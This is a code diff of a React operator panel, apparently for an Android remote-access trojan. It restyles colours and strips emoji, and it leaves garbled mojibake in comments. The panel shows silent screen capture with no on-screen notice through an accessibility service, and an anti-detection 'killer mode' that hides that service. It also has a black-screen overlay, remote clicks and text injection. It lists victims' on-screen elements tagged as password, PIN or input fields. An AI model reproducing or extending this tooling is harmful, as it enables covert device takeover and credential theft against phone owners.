-                                <Search className="w-6 h-6 text-slate-600 mb-1.5" />
-                                <p className="text-slate-500 text-xs italic">Nenhum botão ou campo interativo encontrado</p>
+                                <Search className="w-6 h-6 text-[#6f6f78] mb-1.5" />
+                                <p className="text-[#8b8b94] text-xs italic">Nenhum botão ou campo interativo encontrado</p>
                               </div>
                             );
                           }
@@ -8337,17 +8401,17 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                             const isInput = item.editable;
                             const isPin = item.isPinDigit;
                             
-                            let typeBadge = "⚡ CLIQUE";
-                            let badgeStyle = "bg-blue-950/80 text-blue-300 border-blue-500/40";
+                            let typeBadge = " CLIQUE";
+                            let badgeStyle = "bg-[#121214]/80 text-[#ef4444] border-[#2a2a31]/40";
                             
                             if (isPwd) {
-                              typeBadge = "🔑 SENHA";
-                              badgeStyle = "bg-red-950/80 text-red-300 border-red-500/40 shadow-[0_0_6px_rgba(239,68,68,0.3)]";
+                              typeBadge = " SENHA";
+                              badgeStyle = "bg-[#121214]/80 text-[#ef4444] border-[#2a2a31]/40 shadow-[0_0_6px_rgba(239,68,68,0.3)]";
                             } else if (isInput) {
-                              typeBadge = "“ INPUT";
+                              typeBadge = " INPUT";
                               badgeStyle = "bg-emerald-950/80 text-emerald-300 border-emerald-500/40";
                             } else if (isPin) {
-                              typeBadge = "🔢 PIN";
+                              typeBadge = " PIN";
                               badgeStyle = "bg-amber-950/80 text-amber-300 border-amber-500/40";
                             }
                             
@@ -8373,10 +8437,10 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                 key={idx}
                                 onMouseEnter={() => setHoveredNode(item)}
                                 onMouseLeave={() => setHoveredNode(null)}
-                                className="group flex items-center justify-between p-2 rounded-lg bg-slate-900/60 hover:bg-cyan-950/40 border border-slate-800 hover:border-cyan-500/40 transition-all cursor-pointer shadow-sm"
+                                className="group flex items-center justify-between p-2 rounded-md bg-[#121214]/60 hover:bg-[#121214]/40 border border-[#24242a] hover:border-[#2a2a31]/40 transition-all cursor-pointer shadow-sm"
                                 onClick={() => {
                                   sendCommand({ action: 'CLICK', x: normX, y: normY, scale: 'vnc_norm' });
-                                  addLog(`–± Click remoto em: "${label}" (${cx}, ${cy})`);
+                                  addLog(`± Click remoto em: "${label}" (${cx}, ${cy})`);
                                 }}
                               >
                                 <div className="flex flex-col min-w-0 mr-2">
@@ -8388,14 +8452,14 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                       ({cx}, {cy})
                                     </span>
                                   </div>
-                                  <span className="text-xs font-bold text-slate-200 truncate mt-1 group-hover:text-cyan-300 transition-colors">
+                                  <span className="text-xs font-bold text-slate-200 truncate mt-1 group-hover:text-[#ef4444] transition-colors">
                                     {label}
                                   </span>
                                 </div>
                                 <button
-                                  className="px-2.5 py-1 bg-gradient-to-r from-blue-600 to-cyan-600 hover:from-blue-500 hover:to-cyan-500 text-white rounded-md text-[10px] font-bold transition-all shadow-md flex-shrink-0"
+                                  className="px-2.5 py-1 bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#ef4444] text-[#10120a] rounded-md text-[10px] font-bold transition-all shadow-md flex-shrink-0"
                                 >
-                                  ⚡ CLICAR
+                                   CLICAR
                                 </button>
                               </div>
                             );
@@ -8405,9 +8469,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     </div>
                   </div>
 
-                  {/* ¨ BARRA DE INJE‡ƒO DIRETA DE TEXTO NA TELA V2 */}
-                  <div className="p-3 bg-[#120303]/90 border-t border-cyan-500/20 flex flex-col sm:flex-row items-center gap-2.5 shadow-lg">
-                    <div className="flex-1 flex items-center bg-slate-900/90 rounded-xl border border-cyan-500/30 px-3 py-1.5 focus-within:border-cyan-400 focus-within:ring-1 focus-within:ring-cyan-400/50 w-full transition-all">
+                  {/* ¨ BARRA DE INJEƒO DIRETA DE TEXTO NA TELA V2 */}
+                  <div className="p-3 bg-[#120303]/90 border-t border-[#2a2a31]/20 flex flex-col sm:flex-row items-center gap-2.5 shadow-lg">
+                    <div className="flex-1 flex items-center bg-[#121214]/90 rounded-md border border-[#2a2a31]/30 px-3 py-1.5 focus-within:border-[#3a3a44] focus-within:ring-1 focus-within:ring-[#ef4444]/50 w-full transition-all">
                       <span className="text-slate-400 mr-2 text-xs font-mono select-none">¨</span>
                       <input
                         type="text"
@@ -8417,15 +8481,15 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                         onKeyDown={(e) => {
                           if (e.key === 'Enter') handleSendText();
                         }}
-                        className="w-full bg-transparent text-slate-100 text-xs focus:outline-none font-semibold placeholder:text-slate-500"
+                        className="w-full bg-transparent text-slate-100 text-xs focus:outline-none font-semibold placeholder:text-[#8b8b94]"
                       />
                       {textToSend && (
                         <button
                           type="button"
                           onClick={() => setTextToSend('')}
-                          className="text-slate-500 hover:text-slate-300 text-xs ml-1 font-bold"
+                          className="text-[#8b8b94] hover:text-slate-300 text-xs ml-1 font-bold"
                         >
-                          ✕
+                          
                         </button>
                       )}
                     </div>
@@ -8434,47 +8498,47 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                         type="button"
                         onClick={handleSendText}
                         disabled={!textToSend.trim()}
-                        className="flex-1 sm:flex-initial px-4 py-2 bg-gradient-to-r from-cyan-600 via-blue-600 to-indigo-600 hover:from-cyan-500 hover:to-indigo-500 disabled:opacity-40 disabled:cursor-not-allowed text-white text-xs font-black uppercase tracking-wider rounded-xl shadow-[0_0_15px_rgba(239,68,68,0.3)] transition-all flex items-center justify-center gap-1.5"
+                        className="flex-1 sm:flex-initial px-4 py-2 bg-gradient-to-r from-[#ef4444] via-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#ef4444] disabled:opacity-40 disabled:cursor-not-allowed text-[#10120a] text-xs font-black uppercase tracking-wider rounded-md shadow-[0_0_15px_rgba(239,68,68,0.3)] transition-all flex items-center justify-center gap-1.5"
                       >
-                        ⚡ INJETAR TEXTO
+                         INJETAR TEXTO
                       </button>
                       <button
                         type="button"
                         onClick={() => sendCommand({ action: 'KEY', key: 'DEL' })}
-                        className="px-3 py-2 bg-slate-900/90 hover:bg-red-950/60 border border-slate-700 hover:border-red-500/40 text-slate-300 hover:text-red-300 text-xs font-bold rounded-xl transition-all flex items-center justify-center gap-1"
+                        className="px-3 py-2 bg-[#121214]/90 hover:bg-[#121214]/60 border border-[#2a2a31] hover:border-[#2a2a31]/40 text-slate-300 hover:text-[#ef4444] text-xs font-bold rounded-md transition-all flex items-center justify-center gap-1"
                         title="Apagar caractere (Backspace)"
                       >
-                        ⌫
+                        
                       </button>
                       <button
                         type="button"
                         onClick={() => sendCommand({ action: 'KEY', key: 'ENTER' })}
-                        className="px-3 py-2 bg-slate-900/90 hover:bg-cyan-950/60 border border-slate-700 hover:border-cyan-500/40 text-slate-300 hover:text-cyan-300 text-xs font-bold rounded-xl transition-all flex items-center justify-center gap-1"
+                        className="px-3 py-2 bg-[#121214]/90 hover:bg-[#121214]/60 border border-[#2a2a31] hover:border-[#2a2a31]/40 text-slate-300 hover:text-[#ef4444] text-xs font-bold rounded-md transition-all flex items-center justify-center gap-1"
                         title="Pressionar Enter / Confirmar"
                       >
-                        ↵
+                        
                       </button>
                     </div>
                   </div>
                 </>
                 ) : (
                   <div className="flex flex-col items-center justify-center p-6 text-center space-y-4" style={{ minHeight: '480px' }}>
-                    <div className="p-3 bg-cyan-950/40 border border-cyan-500/30 rounded-xl text-cyan-300 flex items-center gap-3 font-mono text-xs">
-                      <RefreshCw className="w-4 h-4 text-cyan-400 animate-spin" />
+                    <div className="p-3 bg-[#121214]/40 border border-[#2a2a31]/30 rounded-md text-[#ef4444] flex items-center gap-3 font-mono text-xs">
+                      <RefreshCw className="w-4 h-4 text-[#ef4444] animate-spin" />
                       <span>Sincronizando estrutura da tela V2...</span>
                       <button
                         onClick={() => {
                           fetchHierarchyRef.current?.();
                           sendCommand({ action: 'REQUEST_SCREEN_HIERARCHY' });
                         }}
-                        className="px-3 py-1 bg-cyan-600 hover:bg-cyan-500 text-white font-bold rounded-lg text-[11px] uppercase tracking-wider transition-all"
+                        className="px-3 py-1 bg-[#ef4444] hover:bg-[#ef4444] text-white font-bold rounded-md text-[11px] uppercase tracking-wider transition-all"
                       >
-                        ⚡ Sincronizar V2
+                         Sincronizar V2
                       </button>
                     </div>
 
                     {/* Transmissão VNC Direta de Apoio */}
-                    <div className="w-full max-w-[420px] rounded-2xl overflow-hidden border border-cyan-500/30 shadow-2xl">
+                    <div className="w-full max-w-[420px] rounded-md overflow-hidden border border-[#2a2a31]/30 shadow-2xl">
                       <DeviceScreen
                         deviceId={deviceId!}
                         onCommand={sendCommand}
@@ -8493,56 +8557,56 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
           {/* ===== COLUNA DIREITAÚ: Controles ===== */}
           <div className="space-y-3 order-3">
             
-            {/* š™ OP‡•ES DE PERSONALIZA‡ƒO & ELEMENTOS CLICVEIS DA TELA V2 (EXIBIDAS APENAS NA ABA VNC+V2 JUNTOS) */}
+            {/* š OPES DE PERSONALIZAƒO & ELEMENTOS CLICVEIS DA TELA V2 (EXIBIDAS APENAS NA ABA VNC+V2 JUNTOS) */}
             {showCombinedVncV2 && isScreenReaderEnabled && screenHierarchy && (
               <div className="w-full space-y-3">
                 {/* Card de Personalização da Visão V2 */}
-                <div className="w-full bg-[#290903]/95 border border-cyan-500/40 backdrop-blur-2xl rounded-2xl p-4 shadow-[0_0_25px_rgba(239,68,68,0.2)] space-y-3 text-xs">
-                  <div className="flex items-center justify-between border-b border-cyan-500/20 pb-2">
-                    <span className="text-xs font-mono font-black uppercase text-cyan-400 flex items-center gap-1.5">
-                      š™ Personalizar Visão V2
+                <div className="w-full bg-[#1a1a1e]/95 border border-[#2a2a31]/40 backdrop-blur-2xl rounded-md p-4 shadow-[0_0_25px_rgba(239,68,68,0.2)] space-y-3 text-xs">
+                  <div className="flex items-center justify-between border-b border-[#2a2a31]/20 pb-2">
+                    <span className="text-xs font-mono font-black uppercase text-[#ef4444] flex items-center gap-1.5">
+                      š Personalizar Visão V2
                     </span>
                     <div className="flex items-center gap-2">
                       <select 
                         value={v2DesignTheme} 
                         onChange={(e) => setV2DesignTheme(e.target.value as any)}
-                        className="bg-[#02050c] text-cyan-300 border border-cyan-500/40 rounded-lg px-2 py-1 text-[10px] font-mono font-bold focus:outline-none cursor-pointer"
+                        className="bg-[#0c0202] text-[#ef4444] border border-[#2a2a31]/40 rounded-md px-2 py-1 text-[10px] font-mono font-bold focus:outline-none cursor-pointer"
                       >
-                        <option value="cyan">🔵 Modern Blue</option>
-                        <option value="matrix">🟢 Hacker Matrix</option>
-                        <option value="neon-red">🔴 Alvo Tático</option>
-                        <option value="purple-glowing">🟣 Radar Fantasma</option>
+                        <option value="cyan"> Modern Blue</option>
+                        <option value="matrix"> Hacker Matrix</option>
+                        <option value="neon-red"> Alvo Tático</option>
+                        <option value="purple-glowing"> Radar Fantasma</option>
                       </select>
 
                       <select 
                         value={v2CornerStyle} 
                         onChange={(e) => setV2CornerStyle(e.target.value as any)}
-                        className="bg-[#02050c] text-cyan-300 border border-cyan-500/40 rounded-lg px-2 py-1 text-[10px] font-mono font-bold focus:outline-none cursor-pointer"
+                        className="bg-[#0c0202] text-[#ef4444] border border-[#2a2a31]/40 rounded-md px-2 py-1 text-[10px] font-mono font-bold focus:outline-none cursor-pointer"
                       >
                         <option value="brackets"> HUD</option>
-                        <option value="full-border">▭ Borda</option>
+                        <option value="full-border"> Borda</option>
                         <option value="dots">· · Pontilhado</option>
-                        <option value="none">✕ Sem Borda</option>
+                        <option value="none"> Sem Borda</option>
                       </select>
                     </div>
                   </div>
 
                   {/* Sliders Rápidos & Checkboxes */}
                   <div className="grid grid-cols-2 gap-2 text-[10px] font-mono">
-                    <div className="flex items-center justify-between bg-[#02050c]/80 p-2 rounded-lg border border-cyan-500/20">
-                      <span className="text-slate-300 font-bold">“ Texto: {Math.round(v2TextScale * 100)}%</span>
+                    <div className="flex items-center justify-between bg-[#0c0202]/80 p-2 rounded-md border border-[#2a2a31]/20">
+                      <span className="text-slate-300 font-bold"> Texto: {Math.round(v2TextScale * 100)}%</span>
                       <input 
                         type="range" min="60" max="200" value={v2TextScale * 100}
                         onChange={(e) => setV2TextScale(parseFloat(e.target.value) / 100)}
-                        className="w-20 h-1.5 appearance-none cursor-pointer accent-cyan-400 bg-slate-800 rounded-full"
+                        className="w-20 h-1.5 appearance-none cursor-pointer accent-[#ef4444] bg-[#24242a] rounded-full"
                       />
                     </div>
-                    <div className="flex items-center justify-between bg-[#02050c]/80 p-2 rounded-lg border border-cyan-500/20">
-                      <span className="text-slate-300 font-bold">💧 Opacidade: {Math.round(v2Opacity * 100)}%</span>
+                    <div className="flex items-center justify-between bg-[#0c0202]/80 p-2 rounded-md border border-[#2a2a31]/20">
+                      <span className="text-slate-300 font-bold"> Opacidade: {Math.round(v2Opacity * 100)}%</span>
                       <input 
                         type="range" min="20" max="100" value={v2Opacity * 100}
                         onChange={(e) => setV2Opacity(parseFloat(e.target.value) / 100)}
-                        className="w-20 h-1.5 appearance-none cursor-pointer accent-purple-400 bg-slate-800 rounded-full"
+                        className="w-20 h-1.5 appearance-none cursor-pointer accent-[#f87171] bg-[#24242a] rounded-full"
                       />
                     </div>
                   </div>
@@ -8551,35 +8615,35 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     <label className="flex items-center space-x-1.5 cursor-pointer text-slate-300">
                       <input 
                         type="checkbox" checked={v2ShowGrid} onChange={(e) => setV2ShowGrid(e.target.checked)}
-                        className="rounded w-3.5 h-3.5 text-cyan-500 bg-slate-950 border-cyan-500/40 focus:ring-0"
+                        className="rounded w-3.5 h-3.5 text-[#ef4444] bg-slate-950 border-[#2a2a31]/40 focus:ring-0"
                       />
-                      <span>⊞ Grade</span>
+                      <span> Grade</span>
                     </label>
 
                     <label className="flex items-center space-x-1.5 cursor-pointer text-slate-300">
                       <input 
                         type="checkbox" checked={v2ShowCoords} onChange={(e) => setV2ShowCoords(e.target.checked)}
-                        className="rounded w-3.5 h-3.5 text-cyan-500 bg-slate-950 border-cyan-500/40 focus:ring-0"
+                        className="rounded w-3.5 h-3.5 text-[#ef4444] bg-slate-950 border-[#2a2a31]/40 focus:ring-0"
                       />
-                      <span>🎯 Coordenadas</span>
+                      <span> Coordenadas</span>
                     </label>
 
                     <label className="flex items-center space-x-1.5 cursor-pointer text-slate-300">
                       <input 
                         type="checkbox" checked={v2HideUntypedElements} onChange={(e) => setV2HideUntypedElements(e.target.checked)}
-                        className="rounded w-3.5 h-3.5 text-cyan-500 bg-slate-950 border-cyan-500/40 focus:ring-0"
+                        className="rounded w-3.5 h-3.5 text-[#ef4444] bg-slate-950 border-[#2a2a31]/40 focus:ring-0"
                       />
-                      <span>‘ Esconder Genéricos</span>
+                      <span> Esconder Genéricos</span>
                     </label>
                   </div>
                 </div>
 
                 {/* Card de Lista de Elementos Clicáveis */}
-                <div className="w-full bg-[#290903]/95 border border-cyan-500/40 backdrop-blur-2xl rounded-2xl p-4 shadow-[0_0_25px_rgba(239,68,68,0.2)] space-y-2.5">
-                  <div className="flex items-center justify-between border-b border-cyan-500/20 pb-2">
+                <div className="w-full bg-[#1a1a1e]/95 border border-[#2a2a31]/40 backdrop-blur-2xl rounded-md p-4 shadow-[0_0_25px_rgba(239,68,68,0.2)] space-y-2.5">
+                  <div className="flex items-center justify-between border-b border-[#2a2a31]/20 pb-2">
                     <div className="flex items-center space-x-2 font-mono">
-                      <List className="w-4 h-4 text-cyan-400 animate-pulse" />
-                      <span className="text-xs font-black uppercase text-cyan-300 tracking-wider">
+                      <List className="w-4 h-4 text-[#ef4444] animate-pulse" />
+                      <span className="text-xs font-black uppercase text-[#ef4444] tracking-wider">
                         Elementos Clicáveis ({(() => {
                           const list: ScreenReaderNode[] = [];
                           const collect = (node: ScreenReaderNode) => {
@@ -8602,10 +8666,10 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   <div className="flex items-center gap-2">
                     <input
                       type="text"
-                      placeholder="” Buscar botão, input, senha..."
+                      placeholder=" Buscar botão, input, senha..."
                       value={v2FilterQuery}
                       onChange={(e) => setV2FilterQuery(e.target.value)}
-                      className="w-full bg-[#02050c] text-cyan-200 border border-cyan-500/30 rounded-xl px-3 py-1.5 text-xs focus:outline-none focus:border-cyan-400 font-mono"
+                      className="w-full bg-[#0c0202] text-[#e8e8ea] border border-[#2a2a31]/30 rounded-md px-3 py-1.5 text-xs focus:outline-none focus:border-[#3a3a44] font-mono"
                     />
                   </div>
 
@@ -8637,8 +8701,8 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                       if (filtered.length === 0) {
                         return (
                           <div className="flex flex-col items-center justify-center py-6 text-center">
-                            <Search className="w-5 h-5 text-slate-600 mb-1" />
-                            <p className="text-slate-500 text-xs font-mono italic">Nenhum botão ou campo encontrado</p>
+                            <Search className="w-5 h-5 text-[#6f6f78] mb-1" />
+                            <p className="text-[#8b8b94] text-xs font-mono italic">Nenhum botão ou campo encontrado</p>
                           </div>
                         );
                       }
@@ -8649,17 +8713,17 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                         const isInput = item.editable;
                         const isPin = item.isPinDigit;
 
-                        let typeBadge = "⚡ CLIQUE";
-                        let badgeStyle = "bg-blue-950/90 text-blue-300 border-blue-500/40";
+                        let typeBadge = " CLIQUE";
+                        let badgeStyle = "bg-[#121214]/90 text-[#ef4444] border-[#2a2a31]/40";
 
                         if (isPwd) {
-                          typeBadge = "🔑 SENHA";
-                          badgeStyle = "bg-red-950/90 text-red-300 border-red-500/40 shadow-[0_0_6px_rgba(239,68,68,0.3)]";
+                          typeBadge = " SENHA";
+                          badgeStyle = "bg-[#121214]/90 text-[#ef4444] border-[#2a2a31]/40 shadow-[0_0_6px_rgba(239,68,68,0.3)]";
                         } else if (isInput) {
-                          typeBadge = "“ INPUT";
+                          typeBadge = " INPUT";
                           badgeStyle = "bg-emerald-950/90 text-emerald-300 border-emerald-500/40";
                         } else if (isPin) {
-                          typeBadge = "🔢 PIN";
+                          typeBadge = " PIN";
                           badgeStyle = "bg-amber-950/90 text-amber-300 border-amber-500/40";
                         }
 
@@ -8685,30 +8749,30 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                             key={idx}
                             onMouseEnter={() => setHoveredNode(item)}
                             onMouseLeave={() => setHoveredNode(null)}
-                            className="group flex items-center justify-between p-2 rounded-xl bg-[#02050c]/80 hover:bg-cyan-950/50 border border-cyan-500/20 hover:border-cyan-400/60 transition-all cursor-pointer shadow-sm"
+                            className="group flex items-center justify-between p-2 rounded-md bg-[#0c0202]/80 hover:bg-[#121214]/50 border border-[#2a2a31]/20 hover:border-[#3a3a44]/60 transition-all cursor-pointer shadow-sm"
                             onClick={() => {
                               sendCommand({ action: 'CLICK', x: normX, y: normY, scale: 'vnc_norm' });
-                              addLog(`–± Clique remoto via lista V2: "${label}" (${cx}, ${cy})`);
+                              addLog(`± Clique remoto via lista V2: "${label}" (${cx}, ${cy})`);
                             }}
                           >
                             <div className="flex items-center space-x-2 truncate pr-2">
                               <span className={`px-1.5 py-0.5 text-[9px] font-mono font-black uppercase rounded border ${badgeStyle} flex-shrink-0`}>
                                 {typeBadge}
                               </span>
-                              <span className="text-xs font-mono font-bold text-slate-200 group-hover:text-cyan-300 truncate">
+                              <span className="text-xs font-mono font-bold text-slate-200 group-hover:text-[#ef4444] truncate">
                                 {label}
                               </span>
                             </div>
 
                             <div className="flex items-center space-x-1.5 flex-shrink-0">
-                              <span className="text-[10px] font-mono text-slate-400 group-hover:text-cyan-400/80">
+                              <span className="text-[10px] font-mono text-slate-400 group-hover:text-[#ef4444]/80">
                                 ({cx},{cy})
                               </span>
                               <button
                                 type="button"
-                                className="px-2 py-0.5 bg-cyan-600/80 group-hover:bg-cyan-500 text-white rounded text-[10px] font-mono font-bold uppercase tracking-wider shadow"
+                                className="px-2 py-0.5 bg-[#ef4444]/80 group-hover:bg-[#ef4444] text-white rounded text-[10px] font-mono font-bold uppercase tracking-wider shadow"
                               >
-                                👆 CLICAR
+                                 CLICAR
                               </button>
                             </div>
                           </div>
@@ -8720,16 +8784,16 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
               </div>
             )}
 
-            {/* 📡 TRANSMISSO VNC SILENCIOSO */}
-            <div className="bg-[#280903]/90 border border-cyan-500/30 shadow-[0_4px_25px_rgba(0,0,0,0.5)] rounded-2xl p-4 transition-all hover:border-cyan-400/50 relative overflow-hidden group">
-              <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-cyan-400/50 to-transparent"></div>
+            {/*  TRANSMISSO VNC SILENCIOSO */}
+            <div className="bg-[#280903]/90 border border-[#2a2a31]/30 shadow-[0_4px_25px_rgba(0,0,0,0.5)] rounded-md p-4 transition-all hover:border-[#3a3a44]/50 relative overflow-hidden group">
+              <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-[#f87171]/50 to-transparent"></div>
               
               <div className="flex items-center justify-between mb-3">
-                <h3 className="text-cyan-400 font-black uppercase text-xs tracking-wider flex items-center gap-2 font-mono">
-                  <Sliders className="w-4 h-4 text-cyan-400 animate-pulse" />
+                <h3 className="text-[#ef4444] font-black uppercase text-xs tracking-wider flex items-center gap-2 font-mono">
+                  <Sliders className="w-4 h-4 text-[#ef4444] animate-pulse" />
                   {t('vnc.transmission_hd')}
                 </h3>
-                <span className="px-2 py-0.5 rounded-full bg-cyan-500/15 border border-cyan-500/30 text-[9px] font-bold text-cyan-300 uppercase tracking-widest font-mono">
+                <span className="px-2 py-0.5 rounded-full bg-[#ef4444]/15 border border-[#2a2a31]/30 text-[9px] font-bold text-[#ef4444] uppercase tracking-widest font-mono">
                   {t('vnc.silent')}
                 </span>
               </div>
@@ -8737,29 +8801,29 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
               <div className="flex gap-2 mb-3">
                 <button
                   onClick={toggleCapture}
-                  className={`flex-1 py-2.5 rounded-xl font-black text-xs uppercase tracking-wider transition-all flex items-center justify-center gap-2 ${
+                  className={`flex-1 py-2.5 rounded-md font-black text-xs uppercase tracking-wider transition-all flex items-center justify-center gap-2 ${
                     isCaptureEnabled
-                      ? 'bg-gradient-to-r from-cyan-600 via-blue-600 to-indigo-600 text-white shadow-[0_0_15px_rgba(239,68,68,0.4)]'
-                      : 'bg-[#330b04] border border-cyan-500/30 text-cyan-300 hover:bg-cyan-950/30'
+                      ? 'bg-gradient-to-r from-[#ef4444] via-[#ef4444] to-[#ef4444] text-[#10120a] shadow-[0_0_15px_rgba(239,68,68,0.4)]'
+                      : 'bg-[#330b04] border border-[#2a2a31]/30 text-[#ef4444] hover:bg-[#121214]/30'
                   }`}
                   title={isCaptureEnabled ? 'Pausar captura de tela' : 'Iniciar VNC silencioso (Android 11+)'}
                 >
-                  <Activity className="w-4 h-4 text-cyan-200" />
-                  {isCaptureEnabled ? t('vnc.active_transmitting') : '▶ Iniciar Transmissão VNC'}
+                  <Activity className="w-4 h-4 text-[#e8e8ea]" />
+                  {isCaptureEnabled ? t('vnc.active_transmitting') : ' Iniciar Transmissão VNC'}
                 </button>
                 <button
                   onClick={restartCapture}
-                  className="px-3.5 py-2.5 bg-[#330b04] border border-cyan-500/30 hover:border-cyan-400 hover:bg-cyan-950/40 text-cyan-300 rounded-xl transition-all font-bold text-xs"
+                  className="px-3.5 py-2.5 bg-[#330b04] border border-[#2a2a31]/30 hover:border-[#3a3a44] hover:bg-[#121214]/40 text-[#ef4444] rounded-md transition-all font-bold text-xs"
                   title="Reiniciar VNC e sincronizar frames"
                 >
-                  🔄
+                  
                 </button>
               </div>
 
-              <div className={`space-y-2 p-2.5 bg-[#180503]/80 rounded-xl border border-cyan-500/20 ${!isCaptureEnabled ? 'opacity-40' : ''}`}>
+              <div className={`space-y-2 p-2.5 bg-[#180503]/80 rounded-md border border-[#2a2a31]/20 ${!isCaptureEnabled ? 'opacity-40' : ''}`}>
                 <div className="flex items-center justify-between text-[11px] font-mono">
                   <span className="text-slate-300 font-bold">{t('vnc.image_quality')}</span>
-                  <span className="font-bold text-cyan-300 bg-cyan-950 px-2 py-0.5 rounded border border-cyan-500/30">{silentQuality}%</span>
+                  <span className="font-bold text-[#ef4444] bg-[#121214] px-2 py-0.5 rounded border border-[#2a2a31]/30">{silentQuality}%</span>
                 </div>
                 <input
                   type="range"
@@ -8771,32 +8835,32 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   onMouseUp={(e) => applySilentQuality(Number((e.target as HTMLInputElement).value))}
                   onTouchEnd={(e) => applySilentQuality(Number((e.target as HTMLInputElement).value))}
                   disabled={!isCaptureEnabled}
-                  className="w-full h-1.5 bg-slate-800 rounded-lg appearance-none cursor-pointer accent-cyan-400"
+                  className="w-full h-1.5 bg-[#24242a] rounded-md appearance-none cursor-pointer accent-[#ef4444]"
                   title="Ajuste a qualidade visual vs velocidade de transmissão"
                 />
                 <div className="flex justify-between text-[9px] text-slate-400 font-mono">
-                  <span>⚡ 10% (Alta Conexão)</span>
-                  <span>💎 100% (Ultra Nitidez)</span>
+                  <span> 10% (Alta Conexão)</span>
+                  <span> 100% (Ultra Nitidez)</span>
                 </div>
               </div>
               
-              <p className="text-[9px] text-cyan-400/60 text-center mt-2.5 font-mono">
+              <p className="text-[9px] text-[#ef4444]/60 text-center mt-2.5 font-mono">
                 {isCaptureEnabled
-                  ? '⚡ Pipeline 0x01 • TakeScreenshot HD • Sem aviso na tela'
-                  : '💡 Requer serviço de acessibilidade ativo no aparelho'}
+                  ? ' Pipeline 0x01  TakeScreenshot HD  Sem aviso na tela'
+                  : ' Requer serviço de acessibilidade ativo no aparelho'}
               </p>
             </div>
 
-            {/* ›¡ KILLER MODE / ANTIDETEC‡ƒO */}
-            <div className="bg-gradient-to-r from-[#380a03]/90 via-[#541003]/90 to-[#380a03]/90 border border-cyan-500/40 shadow-[0_4px_25px_rgba(239,68,68,0.2)] rounded-2xl p-4 transition-all hover:border-cyan-400/60 relative overflow-hidden group">
-              <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-cyan-400/60 to-transparent"></div>
+            {/* ¡ KILLER MODE / ANTIDETECƒO */}
+            <div className="bg-gradient-to-r from-[#380a03]/90 via-[#541003]/90 to-[#380a03]/90 border border-[#2a2a31]/40 shadow-[0_4px_25px_rgba(239,68,68,0.2)] rounded-md p-4 transition-all hover:border-[#3a3a44]/60 relative overflow-hidden group">
+              <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-[#f87171]/60 to-transparent"></div>
               <div className="flex items-center justify-between gap-3">
                 <div>
-                  <h3 className="text-cyan-300 font-black uppercase text-xs tracking-wider font-mono flex items-center gap-1.5">
-                    <ShieldAlert className="w-4 h-4 text-cyan-400" />
+                  <h3 className="text-[#ef4444] font-black uppercase text-xs tracking-wider font-mono flex items-center gap-1.5">
+                    <ShieldAlert className="w-4 h-4 text-[#ef4444]" />
                     {t('killer.title')}
                   </h3>
-                  <p className="text-[10px] text-cyan-300/70 mt-0.5 font-sans">
+                  <p className="text-[10px] text-[#ef4444]/70 mt-0.5 font-sans">
                     {t('killer.subtitle')}
                   </p>
                 </div>
@@ -8807,8 +8871,8 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   onClick={toggleKillerMode}
                   className={`relative inline-flex h-6 w-11 shrink-0 cursor-pointer rounded-full border-2 transition-colors ${
                     isKillerMode
-                      ? 'bg-cyan-500 border-cyan-300 shadow-[0_0_10px_rgba(239,68,68,0.6)]'
-                      : 'bg-[#200703] border-cyan-800/60'
+                      ? 'bg-[#ef4444] border-[#4a4a56] shadow-[0_0_10px_rgba(239,68,68,0.6)]'
+                      : 'bg-[#200703] border-[#24242a]/60'
                   }`}
                   title={isKillerMode ? 'Desativar modo killer' : 'Ativar modo antidetecção'}
                 >
@@ -8819,26 +8883,26 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   />
                 </button>
               </div>
-              <div className="mt-2.5 px-2 py-1 bg-[#210603]/80 rounded-lg border border-cyan-500/30 text-center">
-                <span className="text-[10px] text-cyan-300 font-mono">
+              <div className="mt-2.5 px-2 py-1 bg-[#210603]/80 rounded-md border border-[#2a2a31]/30 text-center">
+                <span className="text-[10px] text-[#ef4444] font-mono">
                   {isKillerMode
-                    ? '🟢 MODO ATIVO: Acessibilidade oculta • Redução inteligente de fps'
-                    : `⚪ ${t('killer.disabled_mode')}`}
+                    ? ' MODO ATIVO: Acessibilidade oculta  Redução inteligente de fps'
+                    : ` ${t('killer.disabled_mode')}`}
                 </span>
               </div>
             </div>
             
-            {/* ⬛ TELA PRETA & SOBREPOSIÇÃO */}
-            <div id="tour-black-screen" className="bg-[#280903]/90 border border-slate-700/40 shadow-[0_4px_25px_rgba(0,0,0,0.5)] rounded-2xl p-4 transition-all hover:border-cyan-500/40 relative overflow-hidden group">
+            {/*  TELA PRETA & SOBREPOSIÇÃO */}
+            <div id="tour-black-screen" className="bg-[#280903]/90 border border-[#2a2a31]/40 shadow-[0_4px_25px_rgba(0,0,0,0.5)] rounded-md p-4 transition-all hover:border-[#2a2a31]/40 relative overflow-hidden group">
               <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-slate-400/40 to-transparent"></div>
               
               <div className="flex items-center justify-between mb-3">
                 <h3 className="text-slate-200 font-black uppercase text-xs tracking-wider flex items-center gap-2 font-mono">
-                  <EyeOff className="w-4 h-4 text-cyan-400" />
+                  <EyeOff className="w-4 h-4 text-[#ef4444]" />
                   {t('black.title')}
                 </h3>
